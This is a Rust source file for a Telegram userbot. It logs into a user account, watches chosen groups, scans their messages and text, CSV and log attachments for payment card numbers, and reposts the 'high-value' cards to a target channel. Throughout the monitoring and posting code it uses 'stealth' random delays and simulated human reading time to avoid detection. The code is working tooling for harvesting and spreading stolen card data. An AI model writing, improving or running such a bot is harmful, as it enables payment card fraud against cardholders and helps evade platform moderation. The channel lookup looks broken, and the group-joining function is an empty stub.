use grammers_client::{Client, Config as GrammersConfig, InitParams, Update};
use grammers_session::Session;
use grammers_tl_types as tl;
use anyhow::Result;
use std::sync::Arc;
use tokio::time::{sleep, Duration};
use tracing::{info, warn, debug};
use crate::{config::Config, bin_detector::BinDetector, formatter::BinFormatter, stealth::StealthMode};

pub struct TelegramClient {
    client: Client,
    config: Config,
    target_channel_id: i64,
    monitored_groups: Vec<i64>,
}

impl TelegramClient {
    pub async fn connect(config: Config) -> Result<Self> {
        info!("🔌 Connecting to Telegram...");
        
        // Load or create session
        let session = if std::path::Path::new(&config.session_file).exists() {
            Session::load_file(&config.session_file)?
        } else {
            Session::new()
        };
        
        let client = Client::connect(GrammersConfig {
            session,
            api_id: config.api_id,
            api_hash: config.api_hash.clone(),
            params: InitParams {
                app_version: "1.0.0".into(),
                device_model: "Linux".into(),
                system_version: "Ubuntu".into(),
                ..Default::default()
            },
        }).await?;
        
        // Authenticate if needed
        if !client.is_authorized().await? {
            Self::authenticate(&client, &config).await?;
            client.session().save_to_file(&config.session_file)?;
        }
        
        info!("✅ Connected and authenticated");
        
        Ok(Self {
            client,
            target_channel_id: config.target_channel_id,
            monitored_groups: config.monitored_groups.clone(),
            config,
        })
    }
    
    async fn authenticate(client: &Client, config: &Config) -> Result<()> {
        let token = client.request_login_code(&config.phone).await?;
        
        println!("Enter the code you received: ");
        let mut code = String::new();
        std::io::stdin().read_line(&mut code)?;
        let code = code.trim();
        
        match client.sign_in(&token, code).await {
            Ok(_) => info!("✅ Signed in"),
            Err(grammers_client::SignInError::PasswordRequired(password_token)) => {
                println!("Enter your 2FA password: ");
                let mut password = String::new();
                std::io::stdin().read_line(&mut password)?;
                client.check_password(password_token, password.trim()).await?;
                info!("✅ Signed in with 2FA");
            }
            Err(e) => return Err(anyhow::anyhow!("Sign in failed: {}", e)),
        }
        
        Ok(())
    }
    
    pub async fn start_monitoring(
        &mut self,
        detector: Arc<BinDetector>,
        formatter: Arc<BinFormatter>,
        stealth: Arc<StealthMode>,
    ) -> Result<()> {
        info!("👁️ Starting stealth monitoring of {} groups", self.monitored_groups.len());
        
        // Join monitored groups if not already
        for group_id in &self.monitored_groups {
            self.ensure_joined(*group_id).await?;
            
            // Stealth delay between joins
            stealth.random_delay(5.0, 15.0).await;
        }
        
        info!("📡 Monitoring active. Staying under the radar...");
        
        // Main monitoring loop
        loop {
            match self.client.next_update().await {
                Ok(update) => {
                    if let Err(e) = self.handle_update(
                        update,
                        detector.clone(),
                        formatter.clone(),
                        stealth.clone()
                    ).await {
                        warn!("Error handling update: {}", e);
                    }
                }
                Err(e) => {
                    warn!("Update error: {}", e);
                    sleep(Duration::from_secs(5)).await;
                }
            }
        }
    }
    
    async fn handle_update(
        &self,
        update: Update,
        detector: Arc<BinDetector>,
        formatter: Arc<BinFormatter>,
        stealth: Arc<StealthMode>,
    ) -> Result<()> {
        match update {
            Update::NewMessage(message) if !message.outgoing() => {
                // Check if message is from monitored group
                let chat_id = message.chat().pack().id();
                if !self.monitored_groups.contains(&chat_id) {
                    return Ok(());
                }
                
                let text = message.text();
                
                // Quick check if message might contain BINs
                if !detector.has_bins(text) {
                    return Ok(());
                }
                
                // Stealth mode: random delay before processing
                stealth.simulate_human_reading(text.len()).await;
                
                // Detect cards/BINs
                let cards = detector.detect_cards(text);
                
                if !cards.is_empty() {
                    debug!("🎯 Found {} potential cards", cards.len());
                    
                    // Filter high-value only
                    let high_value: Vec<_> = cards.iter()
                        .filter(|c| detector.is_high_value(c))
                        .cloned()
                        .collect();
                    
                    if !high_value.is_empty() {
                        // Format and post to channel
                        let formatted = formatter.format_cards(&high_value, message.chat().name());
                        
                        // Stealth delay before posting
                        stealth.random_delay(2.0, 8.0).await;
                        
                        // Post to target channel
                        self.post_to_channel(&formatted).await?;
                        
                        info!("💳 Posted {} high-value BINs", high_value.len());
                    }
                }
                
                // Also check for files
                if let Some(media) = message.media() {
                    self.handle_media(media, detector, formatter, stealth).await?;
                }
            }
            _ => {}
        }
        
        Ok(())
    }
    
    async fn handle_media(
        &self,
        media: grammers_client::types::Media,
        detector: Arc<BinDetector>,
        formatter: Arc<BinFormatter>,
        stealth: Arc<StealthMode>,
    ) -> Result<()> {
        // Check if it's a document
        if let grammers_client::types::Media::Document(doc) = media {
            let name = doc.name();
            
            // Only process text files
            if name.ends_with(".txt") || name.ends_with(".csv") || name.ends_with(".log") {
                debug!("📄 Processing file: {}", name);
                
                // Download file
                let mut data = Vec::new();
                let mut download = self.client.iter_download(&grammers_client::types::Downloadable::Media(
                    grammers_client::types::Media::Document(doc)
                ));
                
                while let Ok(Some(chunk)) = download.next().await {
                    data.extend(chunk);
                    
                    // Limit file size to prevent memory issues
                    if data.len() > 10 * 1024 * 1024 { // 10MB
                        warn!("File too large, skipping");
                        return Ok(());
                    }
                }
                
                // Convert to text and detect
                if let Ok(text) = String::from_utf8(data) {
                    let cards = detector.detect_cards(&text);
                    
                    let high_value: Vec<_> = cards.iter()
                        .filter(|c| detector.is_high_value(c))
                        .cloned()
                        .collect();
                    
                    if !high_value.is_empty() {
                        let formatted = formatter.format_cards(&high_value, &format!("File: {}", name));
                        
                        stealth.random_delay(3.0, 10.0).await;
                        
                        self.post_to_channel(&formatted).await?;
                        
                        info!("📦 Posted {} BINs from file", high_value.len());
                    }
                }
            }
        }
        
        Ok(())
    }
    
    async fn post_to_channel(&self, content: &str) -> Result<()> {
        // Get target channel
        let channel = self.client.resolve_username(&format!("channel/{}", self.target_channel_id)).await?
            .ok_or_else(|| anyhow::anyhow!("Target channel not found"))?;
        
        // Send message
        self.client.send_message(channel, content).await?;
        
        Ok(())
    }
    
    async fn ensure_joined(&self, group_id: i64) -> Result<()> {
        // This would join the group if not already a member
        // Implementation depends on whether it's a public or private group
        Ok(())
    }
}